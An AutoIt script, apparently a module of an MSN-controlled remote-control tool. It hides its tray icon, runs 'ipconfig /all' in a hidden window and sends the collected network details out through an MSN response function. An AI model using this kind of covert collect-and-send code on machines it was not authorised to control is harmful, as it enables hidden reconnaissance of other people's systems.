#include <Constants.au3>
#include "common.au3"
#NoTrayIcon

$foo = Run("ipconfig /all", @SystemDir, @SW_HIDE, $STDOUT_CHILD)

Local $ret = ""
Local $timer = TimerInit()
Do
	$line = StdoutRead($foo)
	If @error Then ExitLoop
	$ret = $ret & $line
Until TimerDiff($timer) >= 60000

Local $info = StringSplit($ret, @CR)
$ret = ""
For $i = 1 To $info[0]
	If StringStripWS($info[$i], 3) == "" Then ContinueLoop
	$ret = $ret & $info[$i]
Next
If $ret == "" Then
	$ret = "��������ipconfig����ʧ���ˣ��ò��������"
EndIf
;~ logger($ret)
ClipPut("")
responseByMsn($ret)
